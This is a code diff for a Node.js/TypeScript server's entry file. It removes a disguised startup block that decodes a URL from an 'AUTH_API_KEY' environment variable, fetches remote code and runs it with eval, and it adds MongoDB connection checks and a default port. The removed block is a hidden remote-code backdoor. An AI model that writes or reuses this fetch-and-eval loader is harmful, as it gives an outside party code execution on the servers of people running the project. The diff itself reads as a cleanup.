@@ -4,32 +4,25 @@ import app from "./app";
 import { server_config } from "./app/config/server.config";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
-
-
 let server: Server;
 
 async function main() {
   try {
-    await mongoose.connect(server_config.database_url as string);
+    const databaseUrl = server_config.database_url;
+    if (!databaseUrl) {
+      throw new Error(
+        'DATABASE_URL is not defined in .env. Please add your MongoDB connection string.'
+      );
+    }
 
-    server = app.listen(server_config.port, () => {
-      console.log(`app is listening on port ${server_config.port}`);
+    await mongoose.connect(databaseUrl);
+
+    const port = server_config.port || 5000;
+    server = app.listen(port, () => {
+      console.log(`app is listening on port ${port}`);
     });
   } catch (err) {
-    console.log(err);
+    console.error(err);
   }
 }
 
